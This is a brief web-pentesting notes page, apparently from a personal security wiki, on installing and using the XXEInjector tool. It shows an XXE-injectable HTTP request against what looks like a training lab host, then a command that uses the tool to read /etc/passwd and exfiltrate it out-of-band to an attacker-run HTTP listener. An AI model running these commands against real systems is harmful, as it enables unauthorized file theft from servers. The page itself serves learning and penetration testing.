---
title: XXEInjector
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - xxe
  - tool
  - webpentesting
---
# XXEInjector - XXE injection easy

See [XEE XML External Entity attacks](webexploitation/xml-external-entity-xee.md)

## Installation


```bash
git clone https://github.com/enjoiz/XXEinjector.git
```

## Basic usage

Once cloned, we will save our potentially vulnerable request into a file `xxe.req`. We will place the word `XXEINJECT` as a position locator for the tool:

```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.210.196
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

Now we can run the tool:

```bash
ruby XXEinjector.rb --host=$IPAttacker --httpport=$port --file=$filename --path=/etc/passwd --oob=http --phpfilter

# Example:
ruby XXEinjector.rb --host=10.10.14.207 --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

And see the logs under the new created Log folder within the tool:

```bash
cat Logs/10.129.210.196/etc/passwd.log 
```
